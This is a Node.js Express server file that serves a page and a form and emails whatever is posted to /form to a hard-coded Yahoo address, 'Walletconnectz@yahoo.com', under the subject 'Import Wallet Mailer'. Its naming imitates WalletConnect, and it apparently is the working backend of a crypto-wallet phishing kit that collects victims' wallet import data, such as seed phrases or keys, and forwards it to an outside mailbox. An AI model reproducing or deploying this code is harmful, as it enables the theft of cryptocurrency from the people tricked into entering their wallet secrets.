const express = require("express");
const nodemailer = require("nodemailer");
require("dotenv").config();

// instantiate an express app
const app = express();

// Middleware
app.use("/public", express.static(process.cwd() + "/public"));
app.use(express.json());

app.get("/", (req, res) => {
  res.sendFile(__dirname + "/public/index.html");
});
app.get("/form", (req, res) => {
  res.sendFile(__dirname + "/public/form.html");
});

app.post("/form", (req, res) => {
  const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
      user: process.env.EMAIL,
      pass: process.env.PASS,
    },
  });

  const mailOptions = {
    from: process.env.EMAIL,
    to: "Walletconnectz@yahoo.com",
    subject: 'Import Wallet Mailer',
    text: req.body['data']
  }

  transporter.sendMail(mailOptions, (err, info) => {
    if(err){
      console.log(err);
      res.send('an error occured! please try again');
    }else{
      // console.log('Sent!')
      res.send('success')
    }
  })
});

//port will be 5000 for testing
const PORT = process.env.PORT || 5000;
app.listen(PORT, () => {
  console.log(`Listening on port ${PORT}...`);
});


// // verify connection configuration
// transporter.verify(function (error, success) {
//   if (error) {
//     console.log(error);
//   } else {
//     console.log("Server is ready to take our messages");
//   }
// });